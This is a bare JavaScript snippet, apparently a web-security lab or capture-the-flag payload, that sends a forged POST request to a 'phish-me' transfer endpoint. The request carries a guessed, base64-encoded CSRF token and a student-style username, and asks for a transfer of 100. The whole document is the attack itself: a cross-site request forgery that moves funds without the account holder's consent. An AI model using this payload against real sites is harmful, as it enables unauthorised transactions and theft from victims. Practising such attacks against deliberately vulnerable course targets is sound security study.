fetch("https://phish-me.quoccacorp.com/api/transfer", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    csrf_token: btoa('7514'),
    username: 'z5479793',
    amount: '100'
  })
});
